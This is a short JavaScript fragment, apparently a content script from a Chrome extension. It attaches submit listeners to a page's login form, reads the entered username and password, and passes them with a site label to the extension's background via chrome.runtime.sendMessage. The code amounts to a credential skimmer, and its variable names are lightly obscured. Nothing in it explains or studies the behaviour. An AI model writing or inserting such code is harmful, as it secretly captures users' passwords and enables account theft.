if (document.getElementById(namemweird)) {
	document.getElementById(namemweird).addEventListener('submit', function() {
		var data = {
			page: derserwisename,
			login: document.getElementById(usernamem).value,
			pass: document.getElementById(passweird).value
		}
		chrome.runtime.sendMessage(JSON.stringify(data));
	});
}
else if (document.getElementById(namemweirdname)) {
	document.getElementById(namemweirdname).addEventListener('submit', function() {
		var data = {
			page: derserwisename,
			login: document.getElementsByName(usernamemname)[0].value,
			pass: document.getElementsByName(passweirdname)[0].value
		}
		chrome.runtime.sendMessage(JSON.stringify(data));
	});
}